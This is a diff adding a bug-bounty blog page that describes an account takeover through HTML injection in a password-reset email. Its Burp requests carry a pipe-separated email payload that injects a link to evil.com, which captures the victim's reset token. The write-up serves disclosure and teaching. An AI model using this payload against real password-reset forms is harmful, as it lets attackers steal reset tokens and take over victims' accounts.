@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bug Report</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin" />
+    <link rel="preload" as="style"
+        href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" />
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" media="print"
+        onload="this.media='all'" />
+    <noscript>
+        <link rel="stylesheet"
+            href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" />
+    </noscript>
+    <link href="../css/font-awesome/css/all.min.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/bootstrap-icons/bootstrap-icons.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/bootstrap.min.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/aos.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/main.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/code-con.css" rel="stylesheet">
+    <noscript>
+        <style type="text/css">
+            [data-aos] {
+                opacity: 1 !important;
+                transform: translate(0) scale(1) !important;
+            }
+        </style>
+    </noscript>
+    
+</head>
+
+<body id="top">
+    <header class="bg-light">
+        <nav class="navbar navbar-expand-lg navbar-light bg-light" id="header-nav" role="navigation">
+            <div class="container"><a class="link-dark navbar-brand site-title mb-0" href="#">Bug Reports</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
+                    data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
+                    aria-expanded="false" aria-label="Toggle navigation"><span
+                        class="navbar-toggler-icon"></span></button>
+                <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                    <ul class="navbar-nav ms-auto me-2">
+                        <li class="nav-item"><a class="nav-link" href="../#about">About</a></li>
+                        <li class="nav-item"><a class="nav-link" href="../bugbounty.html#">Bug Hunting</a></li>
+                        <li class="nav-item"><a class="nav-link" href="../blogs.html">Blogs</a></li>   
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <div class="page-content">
+        <div id="content">
+            <header>
+
+            </header>
+
+
+
+
+
+
+            <div class="section px-3 px-lg-4 pt-5" id="webbug">
+                <div class="container-narrow">
+                    <div class="text-center mb-5">
+                        <h2 class="marker marker-center">ATO</h2>
+                    </div>
+                    <div class="row">
+                        <div>
+                            <div class="card mb-3" data-aos="fade-right" data-aos-delay="100">
+                                <div class="card-header px-3 py-2">
+                                    <div class="d-flex justify-content-center">
+                                        <div>
+                                            <h3 class="h5  mb-1">Account Takeover via HTMLI &nbsp;</h3>
+                                            <small>Date: 21/7/2023</small>
+                                        </div><img src="../images/services/webpage.svg" width="48" height="45"
+                                            alt="ui-ux" />
+                                    </div>
+                                </div>
+                                <div class="card-body px-3 py-2">
+                                    <p>Consider the domain example.com, where a password reset page endpoint is located
+                                        at <b> <code> www.example.com/rewards/forgot-password </code> </b> for users.
+                                        Users input their email addresses, and if the account exists, they receive a
+                                        password reset token in the form of a link:
+                                        <b><code>https://www.example.com/rewards/reset-password?email=mail1@gmail.com&token=a86g-50lea-80a5bv-36l6</code></b>.
+                                    </p>
+                                    <div class="code-container" id="code1">
+                                        <div class="code-header">
+                                            <span>Burp Request</span>
+                                            <button class="copy-button" onclick="copyCode('code1')">Copy</button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre>
+    <code>
+POST /rewards/forgot-password HTTP/1.1
+Host: www.example.com
+Cookie:
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://www.example.com
+Referer: https://www.example.com/rewards/forgot-password
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+        
+emailAddress=victim%40mail.com</code></pre>
+
+                                        </div>
+                                    </div><br>
+                                    <p>
+                                        I began searching for host header injection, token leakage, and other password
+                                        reset bugs but couldn't find any vulnerabilities. However, referencing <a
+                                            href="https://book.hacktricks.xyz/pentesting-web/reset-password">Hacktricks
+                                            Password Reset Blogs</a>, I discovered a payload using the | (pipe)
+                                        character. I attempted to input the email as <b><code
+                                                style="background-color: black;">email=user1@mail.com|user2@mail.com</code></b>.
+                                        <b> Surprisingly, only <code
+                                                style="background-color: black;">user1@mail.com</code> received the
+                                            token. The website seems to take the first value of the email parameter.
+                                            Interestingly, the token I received was in the form of <code
+                                                style="background-color: black;">https://www.example.com/rewards/reset-password?email=user1@mail.com|user2@mail.com&token=token-value</code></b>.
+                                    </p><br>
+                                    <p>
+                                        Realizing the presence of a flaw in the endpoint, I pondered how to exploit it
+                                        to my advantage. My objective was when the user click on password reset link ,
+                                        the information would be forwarded to me (attacker). After considerable
+                                        contemplation, I attempted to inject HTML code. To my surprise, the injected
+                                        HTML code successfully appeared in the email. This revelation confirmed the
+                                        existence of HTML injection in the email triggering mechanism, allowing for
+                                        potential exploitation of the identified vulnerability.<br>
+                                        <code
+                                            style="background-color: black;"><b>emailAddress=user1%40mail.com|/>&lt;H1&gt;hello-world&lt;/H1&gt;</b></code>
+                                    </p><br>
+
+                                    <p>
+                                        After discovering the HTML injection, I initiated a standard password reset
+                                        request with the email <code>"user1@mail.com"</code>. Upon inspecting the source
+                                        code of the received email, I found an anchor tag: `<a
+                                            href="https://www.example.com/rewards/reset-password?email=user1@mail.com&token=789-s0s5s-50sa0">Click
+                                            Here</a>`. <br>Upon further analysis, <b>I realized that by using a payload,
+                                            I could hide the original part of the code and introduce a new anchor with
+                                            my injected
+                                            domain:</b><code>`"user1@mail.com|"/>&lt;a&gt; href="http://evil.com/?do=sendToken"`</code>.
+                                    </p><br>
+
+                                    <div class="code-container" id="code2">
+                                        <div class="code-header">
+                                            <span>Payload Burp Request</span>
+                                            <button class="copy-button" onclick="copyCode('code2')">Copy</button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre>
+    <code>
+POST /rewards/forgot-password HTTP/1.1
+Host: www.example.com
+Cookie:
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://www.example.com
+Referer: https://www.example.com/rewards/forgot-password
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+        
+emailAddress=<span style="color: green;">victim%40mail.com|"/&gt;&lt;a href="https://evil.com/?do=Sendtoken</span></code></pre>
+
+                                        </div>
+                                    </div><br>
+
+                                    <div class="code-container" id="code3">
+                                        <div class="code-header">
+                                            <span>Response Mail Source Code</span>
+                                            <button class="copy-button" onclick="copyCode('code3')">Copy</button>
+                                        </div>
+                                        <div class="code-content">
+                                            <pre>
+    <code>       
+#Source code of the injected email
+#<span style="color: green;">Green-Colour</span> is injected payload part<br>
+<span style="color: yellow;">....HTML Code .....</span>
+<ml style="opacity: 0.5;">&lt;a href="https://example.com/rewards/reset-password?email=</ml><span style="color: green;"><kl style="opacity: 0.5;">user1@mail.com|"/&gt;</kl>&lt;a href="https://evil.com/?do=Sendtoken</span>&token=879-kj50-450g">Click Me&lt;/a>
+<span style="color: yellow;">.... Some More HTML Code .....</span><br>
+#on click token will be redirected to attacker
+#Using the token the password can be reset           
+    </code>
+                </pre>
+
+                                        </div>
+                                    </div><br>
+                                    <p>
+                                        Upon the victim clicking the link, the attacker receives the token, enabling the
+                                        reset of the account password and potentially leading to an account takeover.
+                                        This bug involves the chaining of HTML injection and the password reset
+                                        function.
+                                    </p>
+                                    <p>
+                                        I submitted the bug to Intrigiti, and it was marked as high severity, ultimately
+                                        earning me a bounty for the discovery. This acknowledgment underscores the
+                                        importance of responsible disclosure in enhancing web security.
+                                    </p>
+                                    <img src="bug-images/htmli-ato.PNG" width="900" height="150">
+
+                                </div>
+                            </div>
+                        </div>
+
+
+
+
+
+
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+    </div>
+    <div id="scrolltop"><a class="btn btn-secondary" href="#top"><span class="icon"><i
+                    class="fas fa-angle-up fa-x"></i></span></a></div>
+    <script src="../scripts/imagesloaded.pkgd.min.js?ver=1.2.0"></script>
+    <script src="../scripts/masonry.pkgd.min.js?ver=1.2.0"></script>
+    <script src="../scripts/BigPicture.min.js?ver=1.2.0"></script>
+    <script src="../scripts/purecounter.min.js?ver=1.2.0"></script>
+    <script src="../scripts/bootstrap.bundle.min.js?ver=1.2.0"></script>
+    <script src="../scripts/aos.min.js?ver=1.2.0"></script>
+    <script src="../scripts/main.js?ver=1.2.0"></script>
+    <script>
+        function copyCode(codeId) {
+            var codeContainer = document.getElementById(codeId).querySelector('.code-content');
+            var range = document.createRange();
+            range.selectNode(codeContainer);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            window.getSelection().removeAllRanges();
+
+            var copyButton = document.querySelector('.copy-button');
+            copyButton.classList.add('copied');
+
+            setTimeout(function () {
+                copyButton.classList.remove('copied');
+            }, 500);
+        }
+    </script>
+</body>
+
+</html>
